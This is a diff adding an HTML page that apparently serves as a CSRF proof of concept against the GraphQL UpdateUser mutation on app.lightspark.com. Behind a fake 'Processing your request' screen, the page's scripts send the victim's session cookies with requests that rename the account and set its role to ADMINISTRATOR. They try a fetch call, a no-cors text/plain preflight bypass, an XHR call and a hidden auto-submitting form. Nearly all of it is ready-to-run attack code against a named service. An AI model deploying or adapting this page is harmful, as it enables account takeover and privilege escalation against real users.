@@ -1,1 +1,212 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Loading...</title>
+  <style>
+    body { 
+      font-family: sans-serif; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      min-height: 100vh; 
+      background: #f0f0f0;
+    }
+    .loader { text-align: center; }
+  </style>
+</head>
+<body>
+<!--
+  CSRF PoC for GraphQL UpdateUser Mutation
+  =========================================
+  
+  Target: POST /graphql/frontend?n=UpdateUser&display_name=kokovoak7
+  Host: app.lightspark.com
+  
+  Vulnerability: No CSRF token protection
+  Attack: Changes user display name and role to ADMINISTRATOR
+  
+  Requirements:
+  - Victim must be logged in to app.lightspark.com
+  - Session cookie must be sent (SameSite=Lax or None)
+  
+  How it works:
+  1. Victim visits this page while logged in
+  2. Auto-submits hidden form or fires fetch request
+  3. Browser attaches session cookie automatically
+  4. User's display_name and role are updated
+-->
 
+<div class="loader">
+  <h2>Processing your request...</h2>
+  <p>Please wait...</p>
+</div>
+
+<script>
+// ============================================================================
+// CONFIGURATION
+// ============================================================================
+
+const TARGET_URL = 'https://app.lightspark.com/graphql/frontend?n=UpdateUser&display_name=ATTACKER_NAME';
+
+// Extract user_id from current session (if accessible) or use hardcoded
+// In this PoC we use a hardcoded value - in real attack, you'd need to know victim's user_id
+const VICTIM_USER_ID = 'User:019b30de-b2a6-04f8-0000-43a25839294c';  // ← Change this
+
+const ATTACKER_DISPLAY_NAME = 'pwned_by_attacker';
+const ESCALATED_ROLE = 'ADMINISTRATOR';
+
+const GRAPHQL_MUTATION = {
+  operationName: "UpdateUser",
+  variables: {
+    user_id: VICTIM_USER_ID,
+    display_name: ATTACKER_DISPLAY_NAME,
+    role: ESCALATED_ROLE,
+    roles: [ESCALATED_ROLE]
+  },
+  query: `mutation UpdateUser($user_id: ID!, $display_name: String!, $role: UserRole!, $roles: [UserRole!]!) {
+  update_user(
+    input: {user_id: $user_id, display_name: $display_name, role: $role, roles: $roles}
+  ) {
+    __typename
+    user {
+      id
+      display_name
+      role
+      __typename
+    }
+  }
+}`
+};
+
+// ============================================================================
+// CSRF ATTACK - METHOD 1: FETCH API
+// ============================================================================
+
+function attackViaFetch() {
+  fetch(TARGET_URL, {
+    method: 'POST',
+    credentials: 'include',  // ← Sends cookies from app.lightspark.com
+    headers: {
+      'Content-Type': 'application/json',
+      'X-Graphql-Operation': 'UpdateUser',
+      'Origin': 'https://app.lightspark.com'  // Spoof origin (may be blocked by CORS)
+    },
+    body: JSON.stringify(GRAPHQL_MUTATION)
+  })
+  .then(response => response.json())
+  .then(data => {
+    console.log('CSRF successful:', data);
+    document.body.innerHTML = '<h1>✓ Account updated</h1><p>Display name changed to: ' + ATTACKER_DISPLAY_NAME + '</p>';
+  })
+  .catch(error => {
+    console.error('CSRF attempt:', error);
+    // Even if CORS blocks reading the response, the mutation may have executed
+    document.body.innerHTML = '<h1>Request sent</h1><p>Check your account settings</p>';
+  });
+}
+
+// ============================================================================
+// CSRF ATTACK - METHOD 2: HIDDEN FORM (if CORS blocks fetch)
+// ============================================================================
+
+function attackViaForm() {
+  // Create a hidden form that POSTs to the GraphQL endpoint
+  const form = document.createElement('form');
+  form.method = 'POST';
+  form.action = TARGET_URL;
+  form.style.display = 'none';
+  
+  // GraphQL expects JSON in the body, but we can't send JSON via form
+  // This method only works if the server also accepts form-encoded data
+  // Most GraphQL servers don't, so fetch() is preferred
+  
+  const input = document.createElement('input');
+  input.name = 'query';
+  input.value = JSON.stringify(GRAPHQL_MUTATION);
+  form.appendChild(input);
+  
+  document.body.appendChild(form);
+  form.submit();
+}
+
+// ============================================================================
+// CSRF ATTACK - METHOD 3: XHR WITH CORS BYPASS ATTEMPT
+// ============================================================================
+
+function attackViaXHR() {
+  const xhr = new XMLHttpRequest();
+  xhr.open('POST', TARGET_URL, true);
+  xhr.withCredentials = true;  // Send cookies
+  
+  xhr.setRequestHeader('Content-Type', 'application/json');
+  xhr.setRequestHeader('X-Graphql-Operation', 'UpdateUser');
+  
+  xhr.onload = function() {
+    if (xhr.status === 200) {
+      console.log('CSRF successful:', xhr.responseText);
+      document.body.innerHTML = '<h1>✓ Attack succeeded</h1>';
+    }
+  };
+  
+  xhr.onerror = function() {
+    console.log('Request sent (response blocked by CORS)');
+    // The mutation may still have executed server-side
+  };
+  
+  xhr.send(JSON.stringify(GRAPHQL_MUTATION));
+}
+
+// ============================================================================
+// CSRF ATTACK - METHOD 4: SIMPLE REQUEST BYPASS (text/plain)
+// ============================================================================
+
+function attackViaSimpleRequest() {
+  // Try to avoid CORS preflight by using text/plain Content-Type
+  // Some servers parse JSON regardless of Content-Type
+  fetch(TARGET_URL, {
+    method: 'POST',
+    credentials: 'include',
+    mode: 'no-cors',  // Opaque response, but request still fires
+    headers: {
+      'Content-Type': 'text/plain'  // Avoids preflight
+    },
+    body: JSON.stringify(GRAPHQL_MUTATION)
+  })
+  .then(() => {
+    console.log('Simple request sent (response opaque)');
+    document.body.innerHTML = '<h1>Request dispatched</h1><p>Mutation may have executed. Check account settings.</p>';
+  });
+}
+
+// ============================================================================
+// EXECUTION
+// ============================================================================
+
+// Try Method 1 first (most reliable if CORS allows)
+setTimeout(() => {
+  attackViaFetch();
+}, 1000);
+
+// If CORS blocks Method 1, try Method 4 (no-cors mode) after 3 seconds
+setTimeout(() => {
+  console.log('Trying no-cors bypass...');
+  attackViaSimpleRequest();
+}, 3000);
+
+</script>
+
+<!-- ALTERNATIVE: Pure HTML form method (requires server to accept form-encoded) -->
+<!--
+<form id="csrfForm" method="POST" action="https://app.lightspark.com/graphql/frontend?n=UpdateUser&display_name=ATTACKER" style="display:none">
+  <input type="hidden" name="operationName" value="UpdateUser">
+  <input type="hidden" name="variables" value='{"user_id":"User:019b30de-b2a6-04f8-0000-43a25839294c","display_name":"ATTACKER","role":"ADMINISTRATOR","roles":["ADMINISTRATOR"]}'>
+  <input type="hidden" name="query" value='mutation UpdateUser($user_id: ID!, $display_name: String!, $role: UserRole!, $roles: [UserRole!]!) { update_user(input: {user_id: $user_id, display_name: $display_name, role: $role, roles: $roles}) { __typename user { id display_name role __typename } } }'>
+</form>
+<script>
+  document.getElementById('csrfForm').submit();
+</script>
+-->
+
+</body>
+</html>
